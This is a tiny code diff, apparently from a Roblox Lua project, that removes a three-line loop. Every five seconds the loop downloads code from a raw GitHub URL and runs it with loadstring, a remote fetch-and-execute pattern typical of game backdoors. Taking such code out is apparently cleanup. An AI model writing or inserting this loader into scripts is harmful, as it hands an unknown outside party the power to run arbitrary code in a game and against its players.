@@ -1,3 +1,0 @@
-while wait(5) do
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ussunududunddnu/VPS/main/clean"))()
-end
